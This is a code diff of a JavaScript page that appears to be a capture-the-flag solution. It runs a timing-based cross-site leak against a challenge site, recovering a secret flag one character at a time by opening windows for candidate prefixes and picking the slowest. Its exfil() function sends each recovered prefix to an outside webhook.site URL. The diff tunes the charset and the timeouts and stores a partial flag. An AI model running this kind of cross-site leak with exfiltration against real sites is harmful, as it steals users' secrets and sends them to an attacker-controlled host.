@@ -5,8 +5,13 @@
 <script>
 const TARGET = "https://svfgp.breakable.live/";
 const WEBHOOK = "https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af";
-let prefix = "CTF{";
-const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
+
+// Pune aici ultimul prefix obținut
+let prefix = "CTF{139";
+
+// Charset redus ca să meargă mai repede
+const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+
 let running = false;
 
 function exfil(msg) {
@@ -24,16 +29,22 @@ function round() {
   const started = new Map();
   const finished = [];
   const wins = [];
+  let decided = false;
 
   function cleanup() {
     window.removeEventListener("message", onMsg);
     for (const w of wins) {
-      try { if (w) w.close(); } catch (_) {}
+      try {
+        if (w) w.close();
+      } catch (_) {}
     }
     running = false;
   }
 
   function chooseBest() {
+    if (decided) return;
+    decided = true;
+
     if (!finished.length) {
       exfil("no-results");
       cleanup();
@@ -43,6 +54,7 @@ function round() {
     finished.sort((a, b) => b.dt - a.dt);
     const best = finished[0];
     prefix = best.sid;
+
     exfil("progress:" + prefix);
 
     cleanup();
@@ -53,7 +65,7 @@ function round() {
       return;
     }
 
-    setTimeout(round, 300);
+    setTimeout(round, 400);
   }
 
   function onMsg(ev) {
@@ -87,9 +99,7 @@ function round() {
     wins.push(w);
   }
 
-  setTimeout(() => {
-    chooseBest();
-  }, 12000);
+  setTimeout(chooseBest, 10000);
 }
 
 exfil("start");
